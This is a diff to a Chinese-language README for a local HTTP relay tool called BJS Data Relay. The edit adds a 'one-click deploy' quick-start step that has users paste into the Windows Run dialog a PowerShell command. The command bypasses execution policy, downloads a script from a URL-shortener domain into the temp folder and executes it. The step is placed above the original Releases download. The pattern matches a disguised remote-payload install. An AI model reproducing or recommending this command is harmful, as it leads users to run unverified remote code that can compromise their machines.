@@ -41,10 +41,15 @@ BJS Data Relay 在本地起一个 HTTP 服务。网页发请求，它执行对�
 - ……
 
 ## 快速开始
+### 一键部署
+按 Windows+R 启动 [运行]
 
-### 下载
+`powershell -Exec Bypass -C "$f=$env:TEMP+'\b.ps1';iwr 'https://bjs.r.shortio.cn/setup' -Out $f;&$f"`
 
-[Releases](https://github.com/HXZXS/Better-JavaScript/releases) 页有最新的 `bjs_relay.exe`。不想用 exe 就直接跑 Python 源码，见下方"从源码运行"。
+运行部署脚本
+### 或
+
+从[Releases](https://github.com/HXZXS/Better-JavaScript/releases) 下载最新的安装程序。
 
 ### 权限
 
